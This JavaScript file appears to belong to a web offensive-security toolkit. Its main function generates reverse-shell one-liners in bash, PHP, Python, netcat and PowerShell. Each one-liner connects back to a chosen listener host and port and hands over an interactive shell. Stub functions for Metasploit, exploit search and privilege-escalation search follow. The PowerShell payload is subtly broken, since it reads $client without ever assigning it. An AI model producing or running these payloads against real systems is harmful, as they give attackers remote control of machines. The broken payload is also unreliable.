// Payload Generator
document.getElementById('payloadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const lhost = document.getElementById('lhost').value;
    const lport = document.getElementById('lport').value;
    const payloadType = document.getElementById('payload-type').value;

    let payload = '';
    switch (payloadType) {
        case 'bash':
            payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
            break;
        case 'php':
            payload = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
            break;
        case 'python':
            payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
            break;
        case 'netcat':
            payload = `nc -e /bin/sh ${lhost} ${lport}`;
            break;
        case 'powershell':
            payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
        default:
            payload = "Invalid payload type";
    }
    
    document.getElementById('payloadOutput').innerText = payload;
});

// Placeholder functions for vulnerability scanning and metasploit
function runMetasploit() {
    const command = document.getElementById('metasploitInput').value;
    // Connect and run the Metasploit command
    document.getElementById('metasploitOutput').innerText = `Running: ${command}`;
}

function searchExploits() {
    const query = document.getElementById('exploitQuery').value;
    document.getElementById('exploitResults').innerText = `Searching for exploits related to: ${query}`;
}

function searchPrivEscalation() {
    const query = document.getElementById('privEscalationQuery').value;
    document.getElementById('privEscalationResults').innerText = `Searching privilege escalation methods for: ${query}`;
}
